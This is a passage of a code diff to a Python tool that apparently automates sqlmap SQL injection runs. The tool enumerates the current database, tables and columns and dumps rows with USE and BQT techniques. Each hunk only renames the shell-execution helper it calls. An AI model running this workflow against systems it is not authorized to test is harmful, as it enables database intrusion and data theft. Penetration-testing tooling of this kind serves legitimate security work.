                         self.sm_command + " --current-db" + " --technique=BQT")
                     current_finished_command_list.append(
                         self.sm_command + " --current-db" + " --technique=BQT")
@@ -1919,7 +1959,7 @@ class Program(object):
                     if self.sm_hex_command + " --current-db" + " --technique=USE" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(
+                        self.output.os_system_combine_argv_with_bottom_status(
                             self.sm_hex_command + " --current-db" + " --technique=USE")
                         current_finished_command_list.append(
                             self.sm_hex_command + " --current-db" + " --technique=USE")
@@ -1938,7 +1978,7 @@ class Program(object):
                 if self.sm_hex_command + " --current-db" + " --technique=BQT" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(
+                    self.output.os_system_combine_argv_with_bottom_status(
                         self.sm_hex_command + " --current-db" + " --technique=BQT")
                     current_finished_command_list.append(
                         self.sm_hex_command + " --current-db" + " --technique=BQT")
@@ -1959,7 +1999,7 @@ class Program(object):
                     if self.sm_no_cast_command + " --current-db" + " --technique=USE" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(
+                        self.output.os_system_combine_argv_with_bottom_status(
                             self.sm_no_cast_command + " --current-db" + " --technique=USE")
                         current_finished_command_list.append(
                             self.sm_no_cast_command + " --current-db" + " --technique=USE")
@@ -1978,7 +2018,7 @@ class Program(object):
                 if self.sm_no_cast_command + " --current-db" + " --technique=BQT" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(
+                    self.output.os_system_combine_argv_with_bottom_status(
                         self.sm_no_cast_command + " --current-db" + " --technique=BQT")
                     current_finished_command_list.append(
                         self.sm_no_cast_command + " --current-db" + " --technique=BQT")
@@ -2003,7 +2043,7 @@ class Program(object):
                     if sm_hex_or_no_cast_command in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command)
+                        self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command)
                         current_finished_command_list.append(sm_hex_or_no_cast_command)
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'hex_or_no_cast', ['--no-cast'])
@@ -2019,7 +2059,7 @@ class Program(object):
                 if sm_hex_or_no_cast_command in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command)
+                    self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command)
                     current_finished_command_list.append(sm_hex_or_no_cast_command)
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'hex_or_no_cast', ['--no-cast'])
@@ -2089,7 +2129,7 @@ class Program(object):
                     if self.sm_command + " --technique=USE" + " --tables" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(
+                        self.output.os_system_combine_argv_with_bottom_status(
                             self.sm_command + " --technique=USE" + " --tables")
                         current_finished_command_list.append(
                             self.sm_command + " --technique=USE" + " --tables")
@@ -2106,7 +2146,7 @@ class Program(object):
                 if self.sm_command + " --technique=BQT" + " --tables" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(
+                    self.output.os_system_combine_argv_with_bottom_status(
                         self.sm_command + " --technique=BQT" + " --tables")
                     current_finished_command_list.append(
                         self.sm_command + " --technique=BQT" + " --tables")
@@ -2125,7 +2165,7 @@ class Program(object):
                     if self.sm_hex_command + " --technique=USE" + " --tables" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(
+                        self.output.os_system_combine_argv_with_bottom_status(
                             self.sm_hex_command + " --technique=USE" + " --tables")
                         current_finished_command_list.append(
                             self.sm_hex_command + " --technique=USE" + " --tables")
@@ -2144,7 +2184,7 @@ class Program(object):
                 if self.sm_hex_command + " --technique=BQT" + " --tables" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(
+                    self.output.os_system_combine_argv_with_bottom_status(
                         self.sm_hex_command + " --technique=BQT" + " --tables")
                     current_finished_command_list.append(
                         self.sm_hex_command + " --technique=BQT" + " --tables")
@@ -2166,7 +2206,7 @@ class Program(object):
                     if cmd in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(cmd)
+                        self.output.os_system_combine_argv_with_bottom_status(cmd)
                         current_finished_command_list.append(cmd)
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
@@ -2184,7 +2224,7 @@ class Program(object):
                 if cmd in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(cmd)
+                    self.output.os_system_combine_argv_with_bottom_status(cmd)
                     current_finished_command_list.append(cmd)
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
@@ -2208,7 +2248,7 @@ class Program(object):
                     if sm_hex_or_no_cast_command in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command)
+                        self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command)
                         current_finished_command_list.append(sm_hex_or_no_cast_command)
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
@@ -2226,7 +2266,7 @@ class Program(object):
                 if sm_hex_or_no_cast_command in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command)
+                    self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command)
                     current_finished_command_list.append(sm_hex_or_no_cast_command)
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
@@ -2296,7 +2336,7 @@ class Program(object):
                     if self.sm_command + " --technique=USE" + " -T " + table_name + " --columns" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_command + " --technique=USE" + 
+                        self.output.os_system_combine_argv_with_bottom_status(self.sm_command + " --technique=USE" + 
                                                                  " -T " + table_name + " --columns")
                         current_finished_command_list.append(
                             self.sm_command + " --technique=USE" + " -T " + table_name + " --columns")
@@ -2313,7 +2353,7 @@ class Program(object):
                 if self.sm_command + " --technique=BQT" + " -T " + table_name + " --columns" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_command + " --technique=BQT" + 
+                    self.output.os_system_combine_argv_with_bottom_status(self.sm_command + " --technique=BQT" + 
                                                              " -T " + table_name + " --columns")
                     current_finished_command_list.append(
                         self.sm_command + " --technique=BQT" + " -T " + table_name + " --columns")
@@ -2332,7 +2372,7 @@ class Program(object):
                     if self.sm_hex_command + " --technique=USE" + " -T " + table_name + " --columns" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_hex_command + " --technique=USE" + 
+                        self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command + " --technique=USE" + 
                                                                  " -T " + table_name + " --columns")
                         current_finished_command_list.append(
                             self.sm_hex_command + " --technique=USE" + " -T " + table_name + " --columns")
@@ -2351,7 +2391,7 @@ class Program(object):
                 if self.sm_hex_command + " --technique=BQT" + " -T " + table_name + " --columns" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_hex_command + " --technique=BQT" + 
+                    self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command + " --technique=BQT" + 
                                                              " -T " + table_name + " --columns")
                     current_finished_command_list.append(
                         self.sm_hex_command + " --technique=BQT" + " -T " + table_name + " --columns")
@@ -2372,7 +2412,7 @@ class Program(object):
                     if self.sm_no_cast_command + " --technique=USE" + " -T " + table_name + " --columns" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_no_cast_command + " --technique=USE" + 
+                        self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command + " --technique=USE" + 
                                                                  " -T " + table_name + " --columns")
                         current_finished_command_list.append(
                             self.sm_no_cast_command + " --technique=USE" + " -T " + table_name + " --columns")
@@ -2391,7 +2431,7 @@ class Program(object):
                 if self.sm_no_cast_command + " --technique=BQT" + " -T " + table_name + " --columns" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_no_cast_command + " --technique=BQT" + 
+                    self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command + " --technique=BQT" + 
                                                              " -T " + table_name + " --columns")
                     current_finished_command_list.append(
                         self.sm_no_cast_command + " --technique=BQT" + " -T " + table_name + " --columns")
@@ -2417,7 +2457,7 @@ class Program(object):
                     if sm_hex_or_no_cast_command in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command)
+                        self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command)
                         current_finished_command_list.append(sm_hex_or_no_cast_command)
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
@@ -2434,7 +2474,7 @@ class Program(object):
                 if sm_hex_or_no_cast_command in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command)
+                    self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command)
                     current_finished_command_list.append(sm_hex_or_no_cast_command)
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
@@ -2504,7 +2544,7 @@ class Program(object):
                     if self.sm_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_command + " --technique=USE" + 
+                        self.output.os_system_combine_argv_with_bottom_status(self.sm_command + " --technique=USE" + 
                                                                  " -T " + table_name + " --dump --stop 3")
                         current_finished_command_list.append(
                             self.sm_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3")
@@ -2523,7 +2563,7 @@ class Program(object):
                 if self.sm_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_command + " --technique=BQT" + 
+                    self.output.os_system_combine_argv_with_bottom_status(self.sm_command + " --technique=BQT" + 
                                                              " -T " + table_name + " --dump --stop 3")
                     current_finished_command_list.append(
                         self.sm_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3")
@@ -2544,7 +2584,7 @@ class Program(object):
                     if self.sm_hex_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_hex_command + " --technique=USE" + 
+                        self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command + " --technique=USE" + 
                                                                  " -T " + table_name + " --dump --stop 3")
                         current_finished_command_list.append(
                             self.sm_hex_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3")
@@ -2565,7 +2605,7 @@ class Program(object):
                 if self.sm_hex_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_hex_command + " --technique=BQT" + 
+                    self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command + " --technique=BQT" + 
                                                              " -T " + table_name + " --dump --stop 3")
                     current_finished_command_list.append(
                         self.sm_hex_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3")
@@ -2588,7 +2628,7 @@ class Program(object):
                     if self.sm_no_cast_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_no_cast_command + " --technique=USE" + 
+                        self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command + " --technique=USE" + 
                                                                  " -T " + table_name + " --dump --stop 3")
                         current_finished_command_list.append(
                             self.sm_no_cast_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3")
@@ -2609,7 +2649,7 @@ class Program(object):
                 if self.sm_no_cast_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_no_cast_command + " --technique=BQT" + 
+                    self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command + " --technique=BQT" + 
                                                              " -T " + table_name + " --dump --stop 3")
                     current_finished_command_list.append(
                         self.sm_no_cast_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3")
@@ -2637,7 +2677,7 @@ class Program(object):
                     if sm_hex_or_no_cast_command in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command)
+                        self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command)
                         current_finished_command_list.append(sm_hex_or_no_cast_command)
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
@@ -2657,7 +2697,7 @@ class Program(object):
                 if sm_hex_or_no_cast_command in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command)
+                    self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command)
                     current_finished_command_list.append(sm_hex_or_no_cast_command)
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
